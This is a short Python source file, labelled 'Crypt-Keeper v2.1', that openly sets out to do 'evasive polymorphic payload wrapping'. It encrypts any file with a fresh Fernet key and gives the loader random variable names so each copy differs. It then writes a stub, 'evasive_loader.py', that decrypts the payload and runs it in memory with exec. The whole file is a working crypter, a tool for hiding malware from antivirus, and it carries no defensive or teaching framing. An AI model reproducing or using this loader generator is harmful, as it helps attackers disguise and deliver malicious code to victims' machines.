# --- Module Context: Crypt-Keeper v2.1 ---
# Purpose: Evasive polymorphic payload wrapping.
# -----------------------------------------
from cryptography.fernet import Fernet
import random
import string


def encrypt_payload(file_path):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    # Generates randomized variable names for the loader
    v_key = ''.join(random.choices(string.ascii_letters, k=8))
    v_data = ''.join(random.choices(string.ascii_letters, k=8))

    stub = f"""
from cryptography.fernet import Fernet
def run():
    {v_key} = Fernet(b'{key.decode()}')
    {v_data} = {v_key}.decrypt(b'{cipher.encrypt(open(file_path, "rb").read()).decode()}')
    exec({v_data}) # In-memory execution
if __name__ == "__main__": run()
"""
    with open("evasive_loader.py", "w") as f:
        f.write(stub)
